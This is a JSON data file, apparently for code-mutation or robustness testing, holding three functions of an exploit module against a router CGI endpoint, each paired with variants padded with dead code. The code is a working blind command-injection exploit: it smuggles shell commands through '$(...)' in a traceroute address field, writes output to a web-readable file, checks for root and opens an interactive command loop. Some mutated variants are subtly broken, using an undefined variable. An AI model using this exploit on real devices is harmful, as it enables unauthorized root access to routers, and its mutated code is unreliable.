[
    {
        "func_name": "run",
        "original": "def run(self):\n    if self.check():\n        print_success('Target is vulnerable')\n        print_status('Blind command injection - response is not available')\n        print_status('Possible extraction point:')\n        print_status('\\t- Inject \"CMD &gt; /usr/share/www/routersploit.check\"')\n        print_status('\\t- The result of CMD will be available at {}:{}/routersploit.check'.format(self.target, self.port))\n        print_status(\"Invoking command loop (type 'exit' or 'quit' to exit the loop)...\")\n        shell(self, architecture='mipsbe')\n    else:\n        print_error('Target is not vulnerable')",
        "mutated": [
            "def run(self):\n    if False:\n        i = 10\n    if self.check():\n        print_success('Target is vulnerable')\n        print_status('Blind command injection - response is not available')\n        print_status('Possible extraction point:')\n        print_status('\\t- Inject \"CMD &gt; /usr/share/www/routersploit.check\"')\n        print_status('\\t- The result of CMD will be available at {}:{}/routersploit.check'.format(self.target, self.port))\n        print_status(\"Invoking command loop (type 'exit' or 'quit' to exit the loop)...\")\n        shell(self, architecture='mipsbe')\n    else:\n        print_error('Target is not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if self.check():\n        print_success('Target is vulnerable')\n        print_status('Blind command injection - response is not available')\n        print_status('Possible extraction point:')\n        print_status('\\t- Inject \"CMD &gt; /usr/share/www/routersploit.check\"')\n        print_status('\\t- The result of CMD will be available at {}:{}/routersploit.check'.format(self.target, self.port))\n        print_status(\"Invoking command loop (type 'exit' or 'quit' to exit the loop)...\")\n        shell(self, architecture='mipsbe')\n    else:\n        print_error('Target is not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if self.check():\n        print_success('Target is vulnerable')\n        print_status('Blind command injection - response is not available')\n        print_status('Possible extraction point:')\n        print_status('\\t- Inject \"CMD &gt; /usr/share/www/routersploit.check\"')\n        print_status('\\t- The result of CMD will be available at {}:{}/routersploit.check'.format(self.target, self.port))\n        print_status(\"Invoking command loop (type 'exit' or 'quit' to exit the loop)...\")\n        shell(self, architecture='mipsbe')\n    else:\n        print_error('Target is not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if self.check():\n        print_success('Target is vulnerable')\n        print_status('Blind command injection - response is not available')\n        print_status('Possible extraction point:')\n        print_status('\\t- Inject \"CMD &gt; /usr/share/www/routersploit.check\"')\n        print_status('\\t- The result of CMD will be available at {}:{}/routersploit.check'.format(self.target, self.port))\n        print_status(\"Invoking command loop (type 'exit' or 'quit' to exit the loop)...\")\n        shell(self, architecture='mipsbe')\n    else:\n        print_error('Target is not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if self.check():\n        print_success('Target is vulnerable')\n        print_status('Blind command injection - response is not available')\n        print_status('Possible extraction point:')\n        print_status('\\t- Inject \"CMD &gt; /usr/share/www/routersploit.check\"')\n        print_status('\\t- The result of CMD will be available at {}:{}/routersploit.check'.format(self.target, self.port))\n        print_status(\"Invoking command loop (type 'exit' or 'quit' to exit the loop)...\")\n        shell(self, architecture='mipsbe')\n    else:\n        print_error('Target is not vulnerable')"
        ]
    },
    {
        "func_name": "execute",
        "original": "def execute(self, cmd):\n    headers = {'Content-Type': 'text/xml', 'X-Requested-With': 'XMLHttpRequest'}\n    data = '<cmd><ITEM cmd=\"traceroute\" addr=\"$({})\" /></cmd>'.format(cmd)\n    self.http_request(method='POST', path='/cgi-bin/cgiSrv.cgi', headers=headers, data=data)\n    return ''",
        "mutated": [
            "def execute(self, cmd):\n    if False:\n        i = 10\n    headers = {'Content-Type': 'text/xml', 'X-Requested-With': 'XMLHttpRequest'}\n    data = '<cmd><ITEM cmd=\"traceroute\" addr=\"$({})\" /></cmd>'.format(cmd)\n    self.http_request(method='POST', path='/cgi-bin/cgiSrv.cgi', headers=headers, data=data)\n    return ''",
            "def execute(self, cmd):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    headers = {'Content-Type': 'text/xml', 'X-Requested-With': 'XMLHttpRequest'}\n    data = '<cmd><ITEM cmd=\"traceroute\" addr=\"$({})\" /></cmd>'.format(cmd)\n    self.http_request(method='POST', path='/cgi-bin/cgiSrv.cgi', headers=headers, data=data)\n    return ''",
            "def execute(self, cmd):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    headers = {'Content-Type': 'text/xml', 'X-Requested-With': 'XMLHttpRequest'}\n    data = '<cmd><ITEM cmd=\"traceroute\" addr=\"$({})\" /></cmd>'.format(cmd)\n    self.http_request(method='POST', path='/cgi-bin/cgiSrv.cgi', headers=headers, data=data)\n    return ''",
            "def execute(self, cmd):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    headers = {'Content-Type': 'text/xml', 'X-Requested-With': 'XMLHttpRequest'}\n    data = '<cmd><ITEM cmd=\"traceroute\" addr=\"$({})\" /></cmd>'.format(cmd)\n    self.http_request(method='POST', path='/cgi-bin/cgiSrv.cgi', headers=headers, data=data)\n    return ''",
            "def execute(self, cmd):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    headers = {'Content-Type': 'text/xml', 'X-Requested-With': 'XMLHttpRequest'}\n    data = '<cmd><ITEM cmd=\"traceroute\" addr=\"$({})\" /></cmd>'.format(cmd)\n    self.http_request(method='POST', path='/cgi-bin/cgiSrv.cgi', headers=headers, data=data)\n    return ''"
        ]
    },
    {
        "func_name": "check",
        "original": "@mute\ndef check(self):\n    headers = {'Content-Type': 'text/xml', 'X-Requested-With': 'XMLHttpRequest'}\n    data = '<cmd><ITEM cmd=\"traceroute\" addr=\"$({})\" /></cmd>'\n    cmd_echo = data.format(u'echo &quot;$USER&quot; &gt; /usr/share/www/routersploit.check')\n    response = self.http_request(method='POST', path='/cgi-bin/cgiSrv.cgi', headers=headers, data=cmd_echo)\n    if not response or u'status=\"doing\"' not in response.text:\n        return False\n    response = self.http_request(method='GET', path='/routersploit.check')\n    if not response.status_code == 200 or u'root' not in response.text:\n        return False\n    cmd_rm = data.format('rm -f /usr/share/www/routersploit.check')\n    self.http_request(method='POST', path='/cgi-bin/cgiSrv.cgi', headers=headers, data=cmd_rm)\n    return True",
        "mutated": [
            "@mute\ndef check(self):\n    if False:\n        i = 10\n    headers = {'Content-Type': 'text/xml', 'X-Requested-With': 'XMLHttpRequest'}\n    data = '<cmd><ITEM cmd=\"traceroute\" addr=\"$({})\" /></cmd>'\n    cmd_echo = data.format(u'echo &quot;$USER&quot; &gt; /usr/share/www/routersploit.check')\n    response = self.http_request(method='POST', path='/cgi-bin/cgiSrv.cgi', headers=headers, data=cmd_echo)\n    if not response or u'status=\"doing\"' not in response.text:\n        return False\n    response = self.http_request(method='GET', path='/routersploit.check')\n    if not response.status_code == 200 or u'root' not in response.text:\n        return False\n    cmd_rm = data.format('rm -f /usr/share/www/routersploit.check')\n    self.http_request(method='POST', path='/cgi-bin/cgiSrv.cgi', headers=headers, data=cmd_rm)\n    return True",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    headers = {'Content-Type': 'text/xml', 'X-Requested-With': 'XMLHttpRequest'}\n    data = '<cmd><ITEM cmd=\"traceroute\" addr=\"$({})\" /></cmd>'\n    cmd_echo = data.format(u'echo &quot;$USER&quot; &gt; /usr/share/www/routersploit.check')\n    response = self.http_request(method='POST', path='/cgi-bin/cgiSrv.cgi', headers=headers, data=cmd_echo)\n    if not response or u'status=\"doing\"' not in response.text:\n        return False\n    response = self.http_request(method='GET', path='/routersploit.check')\n    if not response.status_code == 200 or u'root' not in response.text:\n        return False\n    cmd_rm = data.format('rm -f /usr/share/www/routersploit.check')\n    self.http_request(method='POST', path='/cgi-bin/cgiSrv.cgi', headers=headers, data=cmd_rm)\n    return True",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    headers = {'Content-Type': 'text/xml', 'X-Requested-With': 'XMLHttpRequest'}\n    data = '<cmd><ITEM cmd=\"traceroute\" addr=\"$({})\" /></cmd>'\n    cmd_echo = data.format(u'echo &quot;$USER&quot; &gt; /usr/share/www/routersploit.check')\n    response = self.http_request(method='POST', path='/cgi-bin/cgiSrv.cgi', headers=headers, data=cmd_echo)\n    if not response or u'status=\"doing\"' not in response.text:\n        return False\n    response = self.http_request(method='GET', path='/routersploit.check')\n    if not response.status_code == 200 or u'root' not in response.text:\n        return False\n    cmd_rm = data.format('rm -f /usr/share/www/routersploit.check')\n    self.http_request(method='POST', path='/cgi-bin/cgiSrv.cgi', headers=headers, data=cmd_rm)\n    return True",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    headers = {'Content-Type': 'text/xml', 'X-Requested-With': 'XMLHttpRequest'}\n    data = '<cmd><ITEM cmd=\"traceroute\" addr=\"$({})\" /></cmd>'\n    cmd_echo = data.format(u'echo &quot;$USER&quot; &gt; /usr/share/www/routersploit.check')\n    response = self.http_request(method='POST', path='/cgi-bin/cgiSrv.cgi', headers=headers, data=cmd_echo)\n    if not response or u'status=\"doing\"' not in response.text:\n        return False\n    response = self.http_request(method='GET', path='/routersploit.check')\n    if not response.status_code == 200 or u'root' not in response.text:\n        return False\n    cmd_rm = data.format('rm -f /usr/share/www/routersploit.check')\n    self.http_request(method='POST', path='/cgi-bin/cgiSrv.cgi', headers=headers, data=cmd_rm)\n    return True",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    headers = {'Content-Type': 'text/xml', 'X-Requested-With': 'XMLHttpRequest'}\n    data = '<cmd><ITEM cmd=\"traceroute\" addr=\"$({})\" /></cmd>'\n    cmd_echo = data.format(u'echo &quot;$USER&quot; &gt; /usr/share/www/routersploit.check')\n    response = self.http_request(method='POST', path='/cgi-bin/cgiSrv.cgi', headers=headers, data=cmd_echo)\n    if not response or u'status=\"doing\"' not in response.text:\n        return False\n    response = self.http_request(method='GET', path='/routersploit.check')\n    if not response.status_code == 200 or u'root' not in response.text:\n        return False\n    cmd_rm = data.format('rm -f /usr/share/www/routersploit.check')\n    self.http_request(method='POST', path='/cgi-bin/cgiSrv.cgi', headers=headers, data=cmd_rm)\n    return True"
        ]
    }
]